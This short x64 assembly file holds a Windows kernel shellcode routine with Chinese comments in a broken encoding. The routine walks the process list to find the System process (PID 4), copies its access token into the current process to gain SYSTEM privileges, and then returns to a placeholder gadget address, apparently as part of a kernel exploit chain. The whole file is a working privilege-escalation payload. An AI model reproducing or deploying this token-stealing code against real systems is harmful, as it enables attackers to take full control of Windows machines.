.code
ShellCode proc
	; shellcode��д
	mov rax, gs:[188h]
	mov rax, [rax+220h]
	mov	rcx, rax
	mov	rdx, 4

findSystemPid:
	mov	rax, [rax+2e8h]
	sub	rax, 2e8h
	cmp	[rax+2e0h], rdx
	jnz findSystemPid

	mov rdx, [rax+348h]
	mov [rcx+348h], rdx
	sub rsp,30h						;��ջƽ��
	mov rax, 0aaaaaaaaaaaaaaaah		;���λ�÷Ž���Gadgets���غ�ĺ�벿�ֺ���
	mov [rsp], rax
	ret

ShellCode endp
end